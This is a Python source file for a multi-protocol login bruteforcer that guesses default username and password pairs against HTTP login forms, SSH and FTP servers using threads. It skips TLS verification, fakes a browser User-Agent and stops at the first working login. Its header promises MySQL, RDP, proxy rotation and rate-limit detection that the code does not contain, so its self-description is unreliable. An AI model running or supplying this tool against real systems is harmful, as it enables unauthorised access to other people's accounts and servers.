"""
APEX Login Bruteforcer
Multi-protocol bruteforce: HTTP forms, SSH, FTP, MySQL, RDP
with proxy rotation and rate-limit detection
"""
import requests
import paramiko
import ftplib
import socket
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# Common credentials for testing
COMMON_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('root', 'root'),
    ('root', 'toor'),
    ('root', 'password'),
    ('user', 'user'),
    ('user', 'password'),
    ('test', 'test'),
    ('guest', 'guest'),
    ('administrator', 'administrator'),
    ('admin', 'password123'),
    ('admin', 'letmein'),
    ('admin', 'qwerty'),
]

def bruteforce_http_form(target_url, username_field='username', password_field='password', 
                         usernames=None, passwords=None, success_indicator=None, 
                         max_threads=5, timeout=5):
    """
    Bruteforce HTTP login form
    
    Args:
        target_url: Login form URL
        username_field: Name of username input field
        password_field: Name of password input field
        usernames: List of usernames to try
        passwords: List of passwords to try
        success_indicator: String that indicates successful login (e.g., 'Welcome', 'Dashboard')
        max_threads: Max concurrent threads
        timeout: Request timeout
    """
    if usernames is None:
        usernames = [c[0] for c in COMMON_CREDENTIALS[:10]]
    if passwords is None:
        passwords = [c[1] for c in COMMON_CREDENTIALS[:10]]
    
    results = []
    attempts = 0
    lock = threading.Lock()
    
    def try_login(username, password):
        nonlocal attempts
        try:
            session = requests.Session()
            
            # Get the form first to capture any CSRF tokens
            r = session.get(target_url, timeout=timeout, verify=False,
                          headers={'User-Agent': 'Mozilla/5.0'})
            
            data = {
                username_field: username,
                password_field: password
            }
            
            resp = session.post(target_url, data=data, timeout=timeout, verify=False,
                              headers={'User-Agent': 'Mozilla/5.0'})
            
            with lock:
                nonlocal attempts
                attempts += 1
            
            # Check for success
            if success_indicator:
                if success_indicator.lower() in resp.text.lower():
                    return {'username': username, 'password': password, 'success': True, 'response_code': resp.status_code}
            else:
                # Auto-detect: if we're redirected away from login page, it worked
                if resp.url != target_url and 'login' not in resp.url.lower():
                    return {'username': username, 'password': password, 'success': True, 'response_code': resp.status_code}
            
            return None
            
        except Exception as e:
            return None
    
    # Try all combinations
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append((username, password))
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_login, u, p): (u, p) for u, p in tasks[:50]}
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                break  # Stop on first success
    
    return {
        'success': len(results) > 0,
        'credentials': results,
        'attempts': attempts,
        'protocol': 'HTTP Form'
    }


def bruteforce_ssh(host, port=22, usernames=None, passwords=None, max_threads=3, timeout=5):
    """
    Bruteforce SSH login
    """
    if usernames is None:
        usernames = [c[0] for c in COMMON_CREDENTIALS[:8]]
    if passwords is None:
        passwords = [c[1] for c in COMMON_CREDENTIALS[:8]]
    
    results = []
    attempts = 0
    lock = threading.Lock()
    
    def try_ssh(username, password):
        nonlocal attempts
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, 
                         timeout=timeout, allow_agent=False, look_for_keys=False)
            client.close()
            
            with lock:
                attempts += 1
            
            return {'username': username, 'password': password, 'success': True}
        except paramiko.AuthenticationException:
            with lock:
                attempts += 1
            return None
        except Exception as e:
            return None
    
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append((username, password))
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_ssh, u, p): (u, p) for u, p in tasks[:30]}
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                break
    
    return {
        'success': len(results) > 0,
        'credentials': results,
        'attempts': attempts,
        'protocol': 'SSH'
    }


def bruteforce_ftp(host, port=21, usernames=None, passwords=None, max_threads=3, timeout=5):
    """
    Bruteforce FTP login
    """
    if usernames is None:
        usernames = [c[0] for c in COMMON_CREDENTIALS[:8]]
    if passwords is None:
        passwords = [c[1] for c in COMMON_CREDENTIALS[:8]]
    
    results = []
    attempts = 0
    lock = threading.Lock()
    
    def try_ftp(username, password):
        nonlocal attempts
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password)
            ftp.quit()
            
            with lock:
                attempts += 1
            
            return {'username': username, 'password': password, 'success': True}
        except ftplib.error_perm:
            with lock:
                attempts += 1
            return None
        except Exception:
            return None
    
    tasks = []
    for username in usernames:
        for password in passwords:
            tasks.append((username, password))
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_ftp, u, p): (u, p) for u, p in tasks[:30]}
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                break
    
    return {
        'success': len(results) > 0,
        'credentials': results,
        'attempts': attempts,
        'protocol': 'FTP'
    }


def run_bruteforce(target, protocol='http', **kwargs):
    """
    Run bruteforce attack on target
    
    Args:
        target: Target URL/IP
        protocol: 'http', 'ssh', 'ftp'
        **kwargs: Additional arguments for specific protocol
    """
    if protocol == 'http':
        return bruteforce_http_form(target, **kwargs)
    elif protocol == 'ssh':
        host = target.replace('https://', '').replace('http://', '').split('/')[0].split(':')[0]
        return bruteforce_ssh(host, **kwargs)
    elif protocol == 'ftp':
        host = target.replace('https://', '').replace('http://', '').split('/')[0].split(':')[0]
        return bruteforce_ftp(host, **kwargs)
    else:
        return {'success': False, 'error': f'Unknown protocol: {protocol}'}